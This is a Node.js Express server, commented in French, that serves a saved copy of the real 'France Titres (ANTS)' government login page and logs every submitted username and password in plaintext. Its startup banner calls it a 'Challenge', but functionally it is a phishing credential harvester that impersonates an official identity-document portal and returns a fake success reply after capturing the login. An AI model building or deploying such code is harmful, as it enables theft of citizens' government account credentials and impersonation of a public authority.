// 1. Importation des modules nécessaires
const express = require('express');
const path = require('path');

// 2. Initialisation de l'application Express
const app = express();
const PORT = 3000;

// 3. Configuration des Middleware

// Permet au serveur de comprendre et lire les données envoyées par les formulaires HTML (méthode POST standard)
app.use(express.urlencoded({ extended: true }));

// Permet au serveur de lire du JSON (si vous utilisez "fetch" ou "axios" plus tard dans votre JS client)
app.use(express.json());

// Rend le dossier des ressources (CSS, images, scripts) public et accessible par le navigateur.
// REMARQUE : Assurez-vous que le nom du dossier sur votre ordinateur correspond exactement à celui-ci.
app.use(express.static(path.join(__dirname, 'Connexion – France Titres (ANTS)_files')));


// 4. Définition des Routes

// Route principale (GET http://localhost:3000/)
// Lorsque l'utilisateur arrive sur le site, on lui envoie le fichier HTML principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Connexion – France Titres (ANTS).html'));
});

// Route de réception du formulaire de connexion (POST http://localhost:3000/login)
// C'est ici que les identifiants transitent
app.post('/login', (req, res) => {
    // Récupération des données du formulaire envoyées par le navigateur
    // (Les clés dépendent de l'attribut "name" défini dans vos balises <input> du fichier HTML)
    const username = req.body.username || req.body.login || req.body.email;
    const password = req.body.password;

    // Pour l'instant, on affiche simplement ce que le serveur reçoit dans son terminal de contrôle
    console.log(`[Tentative de connexion] Identifiant reçu : ${username}`);
    console.log(`[Tentative de connexion] Mot de passe reçu : ${password}`);

    // Simulation d'une réponse temporaire en attendant d'y lier une base de données
    // On renvoie un objet JSON simple au navigateur
    res.json({
        status: "success",
        message: "Données de connexion reçues par le serveur basique avec succès."
    });
});


// 5. Démarrage du serveur web sur le port spécifié
app.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(` Serveur du Challenge ANTS démarré avec succès !`);
    console.log(` Accessible à l'adresse : http://localhost:${PORT}`);
    console.log(`====================================================`);
});